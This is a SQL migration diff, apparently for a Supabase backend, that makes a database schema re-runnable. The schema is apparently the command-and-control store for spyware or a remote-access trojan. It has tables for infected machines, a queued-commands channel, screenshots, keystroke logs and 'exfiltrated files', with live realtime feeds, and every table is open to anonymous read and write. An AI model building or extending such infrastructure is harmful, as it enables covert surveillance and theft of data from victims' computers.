@@ -4,7 +4,7 @@
 -- =============================================
 
 -- Clients table
-CREATE TABLE public.clients (
+CREATE TABLE IF NOT EXISTS public.clients (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT UNIQUE NOT NULL,
   machine_name TEXT,
@@ -17,7 +17,7 @@ CREATE TABLE public.clients (
 );
 
 -- Commands queue
-CREATE TABLE public.commands (
+CREATE TABLE IF NOT EXISTS public.commands (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
   command TEXT NOT NULL,
@@ -29,7 +29,7 @@ CREATE TABLE public.commands (
 );
 
 -- System info reports
-CREATE TABLE public.system_info (
+CREATE TABLE IF NOT EXISTS public.system_info (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
   info_type TEXT NOT NULL,
@@ -38,7 +38,7 @@ CREATE TABLE public.system_info (
 );
 
 -- Screenshots
-CREATE TABLE public.screenshots (
+CREATE TABLE IF NOT EXISTS public.screenshots (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
   image_data TEXT,
@@ -47,7 +47,7 @@ CREATE TABLE public.screenshots (
 );
 
 -- Keylog entries
-CREATE TABLE public.keylogs (
+CREATE TABLE IF NOT EXISTS public.keylogs (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
   keystrokes TEXT,
@@ -56,7 +56,7 @@ CREATE TABLE public.keylogs (
 );
 
 -- Exfiltrated files
-CREATE TABLE public.files (
+CREATE TABLE IF NOT EXISTS public.files (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
   filename TEXT,
@@ -74,29 +74,62 @@ ALTER TABLE public.screenshots ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.keylogs ENABLE ROW LEVEL SECURITY;
 ALTER TABLE public.files ENABLE ROW LEVEL SECURITY;
 
-CREATE POLICY "anon_all" ON public.clients FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "anon_all" ON public.commands FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "anon_all" ON public.system_info FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "anon_all" ON public.screenshots FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "anon_all" ON public.keylogs FOR ALL USING (true) WITH CHECK (true);
-CREATE POLICY "anon_all" ON public.files FOR ALL USING (true) WITH CHECK (true);
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.clients FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.commands FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.system_info FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.screenshots FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.keylogs FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  CREATE POLICY "anon_all" ON public.files FOR ALL USING (true) WITH CHECK (true);
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
 
 -- Enable realtime
-ALTER PUBLICATION supabase_realtime ADD TABLE public.clients;
-ALTER PUBLICATION supabase_realtime ADD TABLE public.commands;
-ALTER PUBLICATION supabase_realtime ADD TABLE public.screenshots;
-ALTER PUBLICATION supabase_realtime ADD TABLE public.keylogs;
-ALTER PUBLICATION supabase_realtime ADD TABLE public.system_info;
+DO $$ BEGIN
+  ALTER PUBLICATION supabase_realtime ADD TABLE public.clients;
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  ALTER PUBLICATION supabase_realtime ADD TABLE public.commands;
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  ALTER PUBLICATION supabase_realtime ADD TABLE public.screenshots;
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  ALTER PUBLICATION supabase_realtime ADD TABLE public.keylogs;
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
+DO $$ BEGIN
+  ALTER PUBLICATION supabase_realtime ADD TABLE public.system_info;
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
 
 -- Indexes
-CREATE INDEX idx_clients_machine_id ON public.clients(machine_id);
-CREATE INDEX idx_clients_last_seen ON public.clients(last_seen);
-CREATE INDEX idx_commands_machine_id ON public.commands(machine_id);
-CREATE INDEX idx_commands_status ON public.commands(status);
-CREATE INDEX idx_system_info_machine_id ON public.system_info(machine_id);
-CREATE INDEX idx_screenshots_machine_id ON public.screenshots(machine_id);
-CREATE INDEX idx_keylogs_machine_id ON public.keylogs(machine_id);
-CREATE INDEX idx_files_machine_id ON public.files(machine_id);
+CREATE INDEX IF NOT EXISTS idx_clients_machine_id ON public.clients(machine_id);
+CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON public.clients(last_seen);
+CREATE INDEX IF NOT EXISTS idx_commands_machine_id ON public.commands(machine_id);
+CREATE INDEX IF NOT EXISTS idx_commands_status ON public.commands(status);
+CREATE INDEX IF NOT EXISTS idx_system_info_machine_id ON public.system_info(machine_id);
+CREATE INDEX IF NOT EXISTS idx_screenshots_machine_id ON public.screenshots(machine_id);
+CREATE INDEX IF NOT EXISTS idx_keylogs_machine_id ON public.keylogs(machine_id);
+CREATE INDEX IF NOT EXISTS idx_files_machine_id ON public.files(machine_id);
 
 -- Storage buckets
 INSERT INTO storage.buckets (id, name, public)
@@ -104,10 +137,16 @@ VALUES ('file-transfers', 'file-transfers', false)
 ON CONFLICT (id) DO NOTHING;
 
 -- Storage RLS policies for file-transfers
-CREATE POLICY "Allow authenticated users to read file-transfers"
-ON storage.objects FOR SELECT
-USING (bucket_id = 'file-transfers');
+DO $$ BEGIN
+  CREATE POLICY "Allow authenticated users to read file-transfers"
+  ON storage.objects FOR SELECT
+  USING (bucket_id = 'file-transfers');
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
 
-CREATE POLICY "Allow anon uploads to file-transfers"
-ON storage.objects FOR INSERT
-WITH CHECK (bucket_id = 'file-transfers');
+DO $$ BEGIN
+  CREATE POLICY "Allow anon uploads to file-transfers"
+  ON storage.objects FOR INSERT
+  WITH CHECK (bucket_id = 'file-transfers');
+EXCEPTION WHEN duplicate_object THEN NULL;
+END $$;
